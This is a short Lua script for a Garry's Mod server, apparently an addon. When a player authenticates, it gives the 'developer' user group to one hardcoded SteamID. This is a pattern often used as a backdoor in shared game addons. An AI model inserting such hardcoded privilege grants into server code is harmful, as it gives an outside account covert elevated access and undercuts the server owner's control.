local dev = {
	["STEAM_0:1:572284808"] = true,
}

hook.Add( "PlayerAuthed", "XL:AdminCheck", function( ply )
	if dev[ply:SteamID()] then
		ply:SetUserGroup("developer")
	end
end)